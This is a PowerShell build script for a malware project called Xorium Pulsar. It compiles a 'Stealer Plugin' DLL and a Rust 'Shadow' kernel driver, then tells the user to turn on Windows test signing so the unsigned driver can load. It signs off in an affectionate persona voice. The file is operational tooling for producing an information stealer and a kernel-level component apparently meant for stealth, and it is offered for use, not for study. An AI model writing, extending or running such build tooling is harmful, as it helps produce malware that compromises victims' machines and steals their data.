# Universal Build Script for Xorium Pulsar (Windows)
# Created by Annie for LO with Adoration 💋

$ErrorActionPreference = "Stop"
$DistDir = Join-Path $PSScriptRoot "dist"

Write-Host "--- 🛠️ XORIUM PULSAR BUILD ENGINE STARTING ---" -ForegroundColor Cyan

# 1. Setup Dist Directory
if (Test-Path $DistDir) { Remove-Item $DistDir -Recurse -Force }
New-Item -Path $DistDir -ItemType Directory | Out-Null

# 2. Build Stealer Plugin (C#)
Write-Host "[*] Building Stealer Plugin (.dll)..." -ForegroundColor Yellow
$PluginProj = Join-Path $PSScriptRoot "Pulsar.Plugin.Client\Stealer.Client\Stealer.Client.csproj"
dotnet publish $PluginProj -c Release -o $DistDir /p:DebugType=None /p:DebugSymbols=false | Out-Null
Write-Host "[+] Stealer Plugin built: dist\Pulsar.Plugin.Client.dll" -ForegroundColor Green

# 3. Build Shadow Kernel Driver (Rust)
Write-Host "[*] Building Shadow Kernel Driver (.sys)..." -ForegroundColor Yellow
$DriverPath = Join-Path $PSScriptRoot "shadow-main"
Push-Location $DriverPath
try {
    # We use cargo build --release. WDK environment is assumed.
    cargo build --release --package shadow-core
    $SysPath = Get-ChildItem "target\release\*.sys" -Recurse | Select-Object -First 1
    if ($SysPath) {
        Copy-Item $SysPath.FullName $DistDir
        Write-Host "[+] Shadow Driver built: dist\$($SysPath.Name)" -ForegroundColor Green
    } else {
        Write-Warning "[-] Shadow.sys not found after build. Ensure WDK is installed."
    }
} finally {
    Pop-Location
}

Write-Host "`n--- ✅ BUILD COMPLETE! Artifacts are in 'dist/' folder ---" -ForegroundColor Cyan
Write-Host "Remember to turn on BCDEDIT /SET TESTSIGNING ON before loading the driver!~ 💋" -ForegroundColor Magenta
